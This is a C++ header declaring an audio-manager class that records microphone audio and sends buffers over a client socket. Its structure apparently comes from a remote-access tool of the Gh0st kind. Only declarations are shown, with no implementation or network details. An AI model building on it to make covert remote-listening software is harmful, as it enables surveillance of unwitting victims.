// AudioManager.h: interface for the CAudioManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_AUDIOMANAGER_H__72626E8A_8BA0_4C27_B097_B9180B5E2312__INCLUDED_)
#define AFX_AUDIOMANAGER_H__72626E8A_8BA0_4C27_B097_B9180B5E2312__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "Manager.h"
#include "Audio.h"
#include "Buffer.h"

struct WAVE_INFO
{
	char str[1024];//  
	int nIndex;    // 下标
};

class CAudioManager : public CManager  
{
public:
	CAudioManager(CClientSocket *pClient);
	virtual ~CAudioManager();
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);

	bool Initialize();
	HANDLE	m_hWorkThread,m_hCoreThread;
	bool m_bIsWorking;
	void StopListen();

	int	SendRecordBuffer();
	BOOL SendToken(WAVE_INFO * Wave_Info , BYTE bToken);
	static DWORD WINAPI WorkThread(LPVOID lparam);

	static DWORD WINAPI CoreThread(  LPVOID lparam);
    static DWORD WINAPI SendBuffer(LPVOID lparam);

	CAudio *m_lpAudio;
	CBuffer m_Buffer;
	UINT nMaxBuffer;

	char m_cBufOut[SIZE_AUDIO_FRAME];
	char m_cBufln[SIZE_AUDIO_PACKED]; // 这里只要500就够了
};

#endif // !defined(AFX_AUDIOMANAGER_H__72626E8A_8BA0_4C27_B097_B9180B5E2312__INCLUDED_)
